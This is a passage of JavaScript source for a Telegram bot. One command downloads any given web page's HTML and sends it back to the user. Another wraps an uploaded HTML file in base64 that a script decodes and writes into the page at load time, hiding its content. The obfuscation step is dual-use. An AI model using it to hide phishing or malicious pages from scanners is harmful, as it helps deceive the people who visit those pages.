  }
  
  const url = (match[1] || "").trim();
  if (!/^https?:\/\//i.test(url)) {
    return bot.sendMessage(chatId, "❌ ⵢ Format :  /getcode https://namaweb");
  }

  try {
    const response = await axios.get(url, {
      responseType: "text",
      headers: { "User-Agent": "Mozilla/5.0 (compatible; Bot/1.0)" },
      timeout: 20000
    });
    const htmlContent = response.data;

    const filePath = path.join(__dirname, "web_source.html");
    fs.writeFileSync(filePath, htmlContent, "utf-8");

    await bot.sendDocument(chatId, filePath, {
      caption: `✅ ⵢ Get Code By 𝐕𝐚𝐧𝐭𝐡𝐚𝐫𝐚 ( 🕷️ ) ${url}`
    });

    fs.unlinkSync(filePath);
  } catch (err) {
    console.error(err);
    bot.sendMessage(chatId, "Error" + err);
  }
});

bot.onText(/\/enchtml(?:@[\w_]+)?$/, async (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from?.id;

  if (!msg.reply_to_message || !msg.reply_to_message.document) {
    return bot.sendMessage(chatId, "❌ ⵢ Please Reply File .html");
  }

  try {
    const fileId = msg.reply_to_message.document.file_id;
    const fileInfo = await bot.getFile(fileId);
    const fileUrl = `https://api.telegram.org/file/bot${BOT_TOKEN}/${fileInfo.file_path}`;

    const response = await axios.get(fileUrl, { responseType: "arraybuffer" });
    const htmlContent = global.Buffer.from(response.data).toString("utf8");

    const encoded = global.Buffer.from(htmlContent, "utf8").toString("base64");
    const encryptedHTML = `<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8" />
<title>mbape</title>
<script>
(function(){
  try { document.write(atob("${encoded}")); }
  catch(e){ console.error(e); }
})();
</script>
</head>
<body></body>
</html>`;

    const outputPath = path.join(__dirname, "encrypted.html");
    fs.writeFileSync(outputPath, encryptedHTML, "utf-8");

    await bot.sendDocument(chatId, outputPath, {
      caption: "✅ ⵢ Enc Html By 𝐕𝐚𝐧𝐭𝐡𝐚𝐫𝐚 ( 🕷️ )"
    });

    fs.unlinkSync(outputPath);
  } catch (err) {
    console.error(err);
    bot.sendMessage(chatId, "❌ ⵢ Error Saat Membuat Sticker");
  }
});
